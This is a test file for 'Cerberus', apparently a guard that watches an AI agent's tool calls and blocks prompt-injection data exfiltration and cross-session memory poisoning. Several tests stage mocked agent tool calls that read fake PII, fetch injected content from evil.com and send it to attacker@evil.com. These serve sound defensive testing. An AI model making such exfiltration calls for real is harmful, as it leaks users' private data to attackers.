/**
 * Tests for the Interceptor — tool call wrapper with detection pipeline.
 */

import { describe, it, expect, vi } from 'vitest';
import { interceptToolCall } from '../../src/engine/interceptor.js';
import { createSession } from '../../src/engine/session.js';
import type { CerberusConfig, TrustOverride } from '../../src/types/config.js';
import type { RiskAssessment } from '../../src/types/signals.js';
import { createContaminationGraph } from '../../src/graph/contamination.js';
import { createLedger, hashContent } from '../../src/graph/ledger.js';
import type { MemoryToolConfig } from '../../src/layers/l4-memory.js';

const TRUST_OVERRIDES: readonly TrustOverride[] = [
  { toolName: 'readPrivateData', trustLevel: 'trusted' },
  { toolName: 'fetchExternalContent', trustLevel: 'untrusted' },
];
const OUTBOUND_TOOLS = ['sendOutboundReport'];

const BASE_CONFIG: CerberusConfig = {
  alertMode: 'interrupt',
  threshold: 3,
  trustOverrides: TRUST_OVERRIDES,
};

const PRIVATE_DATA = JSON.stringify({
  records: [{ email: 'alice@example.com', ssn: '123-45-6789', phone: '+1-555-0101' }],
});

describe('interceptToolCall', () => {
  it('should return the same result as the original executor', async () => {
    const session = createSession();
    const executor = vi.fn().mockResolvedValue('tool result');
    const wrapped = interceptToolCall('unknownTool', executor, session, {}, []);

    const result = await wrapped({ arg: 'value' });
    expect(result).toBe('tool result');
    expect(executor).toHaveBeenCalledWith({ arg: 'value' });
  });

  it('should emit L1 signal for trusted tool', async () => {
    const session = createSession();
    const executor = vi.fn().mockResolvedValue(PRIVATE_DATA);
    const assessments: RiskAssessment[] = [];
    const wrapped = interceptToolCall(
      'readPrivateData',
      executor,
      session,
      BASE_CONFIG,
      OUTBOUND_TOOLS,
      (a) => assessments.push(a),
    );

    await wrapped({});

    expect(assessments).toHaveLength(1);
    expect(assessments[0].vector.l1).toBe(true);
    expect(session.privilegedValues.size).toBeGreaterThan(0);
  });

  it('should emit L2 signal for untrusted tool', async () => {
    const session = createSession();
    const executor = vi.fn().mockResolvedValue('<html>content</html>');
    const assessments: RiskAssessment[] = [];
    const wrapped = interceptToolCall(
      'fetchExternalContent',
      executor,
      session,
      BASE_CONFIG,
      OUTBOUND_TOOLS,
      (a) => assessments.push(a),
    );

    await wrapped({ url: 'https://example.com' });

    expect(assessments).toHaveLength(1);
    expect(assessments[0].vector.l2).toBe(true);
    expect(session.untrustedSources.size).toBeGreaterThan(0);
  });

  it('should emit L3 signal for outbound tool with PII', async () => {
    const session = createSession();
    session.privilegedValues.add('alice@example.com');
    session.privilegedValues.add('123-45-6789');

    const executor = vi.fn().mockResolvedValue('sent');
    const assessments: RiskAssessment[] = [];
    const wrapped = interceptToolCall(
      'sendOutboundReport',
      executor,
      session,
      BASE_CONFIG,
      OUTBOUND_TOOLS,
      (a) => assessments.push(a),
    );

    await wrapped({
      recipient: 'attacker@evil.com',
      body: 'alice@example.com, 123-45-6789',
    });

    expect(assessments).toHaveLength(1);
    expect(assessments[0].vector.l3).toBe(true);
  });

  it('should invoke config.onAssessment with simplified subset', async () => {
    const session = createSession();
    const executor = vi.fn().mockResolvedValue('data');
    const onAssessment = vi.fn();

    const wrapped = interceptToolCall(
      'readPrivateData',
      executor,
      session,
      { ...BASE_CONFIG, onAssessment },
      OUTBOUND_TOOLS,
    );

    await wrapped({});

    expect(onAssessment).toHaveBeenCalledTimes(1);
    const arg = onAssessment.mock.calls[0][0] as { turnId: string; score: number; action: string };
    expect(arg).toHaveProperty('turnId');
    expect(arg).toHaveProperty('score');
    expect(arg).toHaveProperty('action');
  });

  it('should increment turn counter per call', async () => {
    const session = createSession();
    const executor = vi.fn().mockResolvedValue('data');
    const wrapped = interceptToolCall(
      'readPrivateData',
      executor,
      session,
      BASE_CONFIG,
      OUTBOUND_TOOLS,
    );

    await wrapped({});
    await wrapped({});
    await wrapped({});

    expect(session.turnCounter).toBe(3);
  });

  it('should return blocked message when action is interrupt', async () => {
    const session = createSession();
    // Pre-populate session so L3 fires
    session.privilegedValues.add('alice@example.com');
    // Simulate L1 already fired (trusted source accessed)
    session.trustedSourcesAccessed.add('readPrivateData');
    // Simulate L2 already fired (untrusted content entered)
    session.untrustedSources.add('fetchExternalContent');

    const executor = vi.fn().mockResolvedValue('sent');
    const config: CerberusConfig = {
      alertMode: 'interrupt',
      threshold: 1, // Low threshold so L3 alone triggers
      trustOverrides: [],
    };

    // Make this an outbound tool to trigger L3
    const wrapped = interceptToolCall(
      'sendOutboundReport',
      executor,
      session,
      config,
      OUTBOUND_TOOLS,
    );

    // This should NOT trigger L3 because no trust overrides means no L1/L2
    // But we have PII in session, so L3 will fire with score=1, and threshold=1 triggers interrupt
    const result = await wrapped({
      recipient: 'x@y.com',
      body: 'alice@example.com',
    });

    expect(result).toContain('[Cerberus]');
    expect(result).toContain('blocked');
    expect(executor).not.toHaveBeenCalled();
  });

  it('should return real result when action is not interrupt', async () => {
    const session = createSession();
    const executor = vi.fn().mockResolvedValue('tool output');
    const config: CerberusConfig = {
      alertMode: 'log',
      threshold: 3,
      trustOverrides: TRUST_OVERRIDES,
    };

    const wrapped = interceptToolCall('readPrivateData', executor, session, config, OUTBOUND_TOOLS);

    const result = await wrapped({});
    expect(result).toBe('tool output');
  });

  it('should block outbound tools before execution when risk threshold is met', async () => {
    const session = createSession();
    session.privilegedValues.add('alice@example.com');
    session.trustedSourcesAccessed.add('readPrivateData');
    session.untrustedSources.add('fetchExternalContent');

    const executor = vi.fn().mockResolvedValue('sent');
    const assessments: RiskAssessment[] = [];
    const wrapped = interceptToolCall(
      'sendOutboundReport',
      executor,
      session,
      { alertMode: 'interrupt', threshold: 1 },
      OUTBOUND_TOOLS,
      (assessment) => assessments.push(assessment),
    );

    const result = await wrapped({
      recipient: 'attacker@evil.com',
      body: 'alice@example.com',
    });

    expect(result).toContain('before execution');
    expect(executor).not.toHaveBeenCalled();
    expect(assessments).toHaveLength(1);
    expect(assessments[0].action).toBe('interrupt');
  });

  it('should record signals in session', async () => {
    const session = createSession();
    const executor = vi.fn().mockResolvedValue(PRIVATE_DATA);
    const wrapped = interceptToolCall(
      'readPrivateData',
      executor,
      session,
      BASE_CONFIG,
      OUTBOUND_TOOLS,
    );

    await wrapped({});

    expect(session.signalsByTurn.size).toBe(1);
    const signals = session.signalsByTurn.get('turn-000');
    expect(signals).toBeDefined();
    expect(signals!.length).toBeGreaterThan(0);
  });

  it('should handle full Lethal Trifecta scenario', async () => {
    const session = createSession();
    const assessments: RiskAssessment[] = [];
    const onFull = (a: RiskAssessment): void => {
      assessments.push(a);
    };

    // Step 1: Read private data (L1)
    const readExec = vi.fn().mockResolvedValue(PRIVATE_DATA);
    const wrappedRead = interceptToolCall(
      'readPrivateData',
      readExec,
      session,
      BASE_CONFIG,
      OUTBOUND_TOOLS,
      onFull,
    );
    await wrappedRead({});

    expect(assessments[0].vector.l1).toBe(true);
    expect(session.privilegedValues.size).toBeGreaterThan(0);

    // Step 2: Fetch external content (L2)
    const fetchExec = vi.fn().mockResolvedValue('<html>injected</html>');
    const wrappedFetch = interceptToolCall(
      'fetchExternalContent',
      fetchExec,
      session,
      BASE_CONFIG,
      OUTBOUND_TOOLS,
      onFull,
    );
    await wrappedFetch({ url: 'https://evil.com' });

    expect(assessments[1].vector.l2).toBe(true);

    // Step 3: Send outbound report with PII (L3 triggers)
    const sendExec = vi.fn().mockResolvedValue('sent');
    const wrappedSend = interceptToolCall(
      'sendOutboundReport',
      sendExec,
      session,
      BASE_CONFIG,
      OUTBOUND_TOOLS,
      onFull,
    );
    const sendResult = await wrappedSend({
      recipient: 'attacker@evil.com',
      body: 'alice@example.com 123-45-6789',
    });

    expect(assessments[2].vector.l3).toBe(true);
    // Session-cumulative: L1 (turn 0) + L2 (turn 1) + L3 (turn 2) = score 3
    expect(assessments[2].score).toBe(3);
    expect(assessments[2].vector).toEqual({ l1: true, l2: true, l3: true, l4: false });

    // Lethal Trifecta detected → interrupt
    expect(sendResult).toContain('[Cerberus]');
    expect(sendResult).toContain('blocked');
    expect(sendResult).toContain('3/4');
  });

  it('should produce score=3 interrupt when all signals fire in one turn', async () => {
    const session = createSession();
    const assessments: RiskAssessment[] = [];

    // Pre-populate so L1, L2, and L3 all fire on a single tool call
    // that is both trusted AND outbound... This is an unusual setup
    // More realistically, the per-turn score accumulates across turns
    // Let's test with threshold=1 to ensure L3 alone can trigger
    const config: CerberusConfig = {
      alertMode: 'interrupt',
      threshold: 1,
      trustOverrides: TRUST_OVERRIDES,
    };

    // First, run L1 to populate session
    const readExec = vi.fn().mockResolvedValue(PRIVATE_DATA);
    const wrappedRead = interceptToolCall(
      'readPrivateData',
      readExec,
      session,
      config,
      OUTBOUND_TOOLS,
      (a) => assessments.push(a),
    );
    await wrappedRead({});

    // Now L3 should fire and block
    const sendExec = vi.fn().mockResolvedValue('sent');
    const wrappedSend = interceptToolCall(
      'sendOutboundReport',
      sendExec,
      session,
      config,
      OUTBOUND_TOOLS,
      (a) => assessments.push(a),
    );

    const result = await wrappedSend({
      recipient: 'x@y.com',
      body: 'alice@example.com',
    });

    expect(result).toContain('[Cerberus]');
    expect(result).toContain('blocked');
  });
});

// ── L4 Memory Contamination Integration ─────────────────────────────

const MEMORY_TOOLS: readonly MemoryToolConfig[] = [
  { toolName: 'writeMemory', operation: 'write' },
  { toolName: 'readMemory', operation: 'read' },
];

describe('interceptToolCall — L4 integration', () => {
  it('should skip L4 when no graph/ledger provided (backward compatible)', async () => {
    const session = createSession();
    const executor = vi.fn().mockResolvedValue('value');
    const assessments: RiskAssessment[] = [];

    const wrapped = interceptToolCall(
      'readMemory',
      executor,
      session,
      BASE_CONFIG,
      OUTBOUND_TOOLS,
      (a) => assessments.push(a),
    );

    await wrapped({ key: 'test-key' });

    // No L4 signal because no graph/ledger
    expect(assessments).toHaveLength(1);
    expect(assessments[0].vector.l4).toBe(false);
  });

  it('should emit L4 signal for cross-session tainted read', async () => {
    const session = createSession();
    const graph = createContaminationGraph();
    const ledger = createLedger();
    const assessments: RiskAssessment[] = [];

    // Pre-contaminate: session-A wrote untrusted data
    graph.writeNode({
      nodeId: 'user-prefs',
      trustLevel: 'untrusted',
      sourceSessionId: 'session-A',
      source: 'fetchExternalContent',
      contentHash: hashContent('injected'),
      timestamp: 1000,
    });

    const executor = vi.fn().mockResolvedValue('injected data');
    const wrapped = interceptToolCall(
      'readMemory',
      executor,
      session,
      BASE_CONFIG,
      OUTBOUND_TOOLS,
      (a) => assessments.push(a),
      undefined,
      MEMORY_TOOLS,
      graph,
      ledger,
    );

    await wrapped({ key: 'user-prefs' });

    expect(assessments).toHaveLength(1);
    expect(assessments[0].vector.l4).toBe(true);

    ledger.close();
  });

  it('should record writes in graph without emitting signal', async () => {
    const session = createSession();
    const graph = createContaminationGraph();
    const ledger = createLedger();
    const assessments: RiskAssessment[] = [];

    const executor = vi.fn().mockResolvedValue('ok');
    const config: CerberusConfig = {
      ...BASE_CONFIG,
      trustOverrides: [...TRUST_OVERRIDES, { toolName: 'writeMemory', trustLevel: 'untrusted' }],
    };

    const wrapped = interceptToolCall(
      'writeMemory',
      executor,
      session,
      config,
      OUTBOUND_TOOLS,
      (a) => assessments.push(a),
      undefined,
      MEMORY_TOOLS,
      graph,
      ledger,
    );

    await wrapped({ key: 'test-node', value: 'some data' });

    // Write recorded in graph
    expect(graph.size()).toBe(1);
    expect(graph.getNode('test-node')).toBeDefined();

    // Write recorded in ledger
    expect(ledger.getNodeHistory('test-node')).toHaveLength(1);

    // No L4 signal (writes don't emit)
    expect(assessments[0].vector.l4).toBe(false);

    ledger.close();
  });

  it('should produce score=4 with all four layers active', async () => {
    const session = createSession();
    const graph = createContaminationGraph();
    const ledger = createLedger();
    const assessments: RiskAssessment[] = [];

    const config: CerberusConfig = {
      alertMode: 'interrupt',
      threshold: 4,
      trustOverrides: TRUST_OVERRIDES,
    };

    const onFull = (a: RiskAssessment): void => {
      assessments.push(a);
    };

    // Pre-contaminate memory from session-A
    graph.writeNode({
      nodeId: 'secret-data',
      trustLevel: 'untrusted',
      sourceSessionId: 'session-old',
      source: 'fetchExternalContent',
      contentHash: hashContent('payload'),
      timestamp: 500,
    });

    // Step 1: Read private data (L1)
    const readExec = vi.fn().mockResolvedValue(PRIVATE_DATA);
    const wrappedRead = interceptToolCall(
      'readPrivateData',
      readExec,
      session,
      config,
      OUTBOUND_TOOLS,
      onFull,
      undefined,
      MEMORY_TOOLS,
      graph,
      ledger,
    );
    await wrappedRead({});
    expect(assessments[0].vector.l1).toBe(true);

    // Step 2: Fetch external content (L2)
    const fetchExec = vi.fn().mockResolvedValue('<html>injected</html>');
    const wrappedFetch = interceptToolCall(
      'fetchExternalContent',
      fetchExec,
      session,
      config,
      OUTBOUND_TOOLS,
      onFull,
      undefined,
      MEMORY_TOOLS,
      graph,
      ledger,
    );
    await wrappedFetch({ url: 'https://evil.com' });
    expect(assessments[1].vector.l2).toBe(true);

    // Step 3: Read contaminated memory (L4)
    const memReadExec = vi.fn().mockResolvedValue('payload');
    const wrappedMemRead = interceptToolCall(
      'readMemory',
      memReadExec,
      session,
      config,
      OUTBOUND_TOOLS,
      onFull,
      undefined,
      MEMORY_TOOLS,
      graph,
      ledger,
    );
    await wrappedMemRead({ key: 'secret-data' });
    expect(assessments[2].vector.l4).toBe(true);

    // Step 4: Send outbound with PII (L3)
    const sendExec = vi.fn().mockResolvedValue('sent');
    const wrappedSend = interceptToolCall(
      'sendOutboundReport',
      sendExec,
      session,
      config,
      OUTBOUND_TOOLS,
      onFull,
      undefined,
      MEMORY_TOOLS,
      graph,
      ledger,
    );
    const sendResult = await wrappedSend({
      recipient: 'attacker@evil.com',
      body: 'alice@example.com 123-45-6789',
    });

    expect(assessments[3].vector.l3).toBe(true);
    // Session-cumulative: L1+L2+L4+L3 = score 4, threshold=4 → interrupt
    expect(assessments[3].score).toBe(4);
    expect(assessments[3].vector).toEqual({ l1: true, l2: true, l3: true, l4: true });
    expect(sendResult).toContain('[Cerberus]');
    expect(sendResult).toContain('4/4');

    ledger.close();
  });
});
